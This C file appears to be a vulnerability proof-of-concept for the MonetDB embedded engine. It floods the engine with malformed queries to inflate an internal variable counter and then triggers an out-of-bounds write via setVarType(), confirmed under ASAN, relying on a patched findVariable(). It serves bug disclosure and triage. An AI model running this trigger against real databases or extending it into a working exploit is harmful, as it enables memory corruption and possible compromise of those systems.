/*
 * MonetDB OOB write demo.
 *
 * Uses patched findVariable() that returns OOB index instead of
 * crashing on the read. This lets setVarType() execute the write,
 * proving the write primitive exists behind the read crash.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "monetdbe.h"

static const char *junk[] = {
    "INVALID", "CREATE FUNCTION", "{{bad}}", "SELECT ''''",
    "DROP SCHEMA nope CASCADE", "CALL nope()", NULL
};

int main(void)
{
    monetdbe_database db = NULL;
    monetdbe_result *result = NULL;
    int errors = 0;

    monetdbe_options opts = {0};
    opts.memorylimit = 256;
    opts.nr_threads = 1;

    int errn = monetdbe_open(&db, NULL, &opts);
    if (errn) {
        fprintf(stderr, "open failed: %d\n", errn);
        return 1;
    }

    printf("oob write demo (patched findVariable to skip read crash)\n\n");

    printf("accumulating vtop...\n");
    for (int r = 0; r < 10000; r++) {
        for (int i = 0; junk[i]; i++) {
            result = NULL;
            monetdbe_query(db, (char *)junk[i], &result, NULL);
            if (result) monetdbe_cleanup_result(db, result);
            errors++;
        }
    }
    printf("done: %d errors\n\n", errors);

    printf("triggering oob write via setVarType...\n");
    result = NULL;
    monetdbe_query(db, "SELECT 1", &result, NULL);
    if (result) monetdbe_cleanup_result(db, result);

    printf("if ASAN reports a WRITE, oob write is confirmed\n");
    monetdbe_close(db);
    return 0;
}
